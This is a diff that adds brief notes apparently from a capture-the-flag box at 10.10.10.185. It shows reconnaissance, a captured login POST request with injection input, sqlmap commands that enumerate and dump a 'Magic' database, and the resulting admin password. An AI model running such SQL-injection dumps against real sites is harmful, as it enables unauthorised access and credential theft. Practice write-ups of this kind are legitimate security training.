@@ -1,0 +1,31 @@
+nmap scan at 10.10.10.185
+
+dirbuster the site - /login.php
+
+POST /login.php HTTP/1.0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.185/login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 19
+Connection: keep-alive
+Cookie: PHPSESSID=0a6kvklk4puu3hlakug4h9d0aa
+Upgrade-Insecure-Requests: 1
+DNT: 1
+
+username=%password=%
+
+sqlmap -r post.txt --level 3 --risk 3 --dbs --threads 10
+
+sqlmap -r post.txt --level 3 --risk 3 -D Magic --tables --threads 10
+
+sqlmap -r post.txt --level 3 --risk 3 -T login --dump  --threads 10
+
++------+----------+----------------+
+| id   | username | password       |
++------+----------+----------------+
+| 1    | admin    | Th3s3usW4sK1ng |
++------+----------+----------------+
+
